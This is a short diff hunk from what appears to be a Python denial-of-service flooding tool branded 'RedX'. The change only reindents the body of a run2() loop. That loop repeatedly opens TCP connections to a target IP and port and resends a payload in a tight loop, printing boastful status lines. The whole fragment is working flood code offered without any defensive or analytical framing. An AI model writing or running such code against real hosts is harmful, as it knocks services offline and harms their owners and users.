@@ -49,12 +49,12 @@ def run2():
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((ip,port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print(i +" RedX Menyenggol ")
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip,port))
+                    s.send(data)
+                    for x in range(times):
+                            s.send(data)
+                    print(i +" RedX Menyenggol ")
                 except:
                         s.close()
                         print("[*] RedX IS HERE DUDE ")
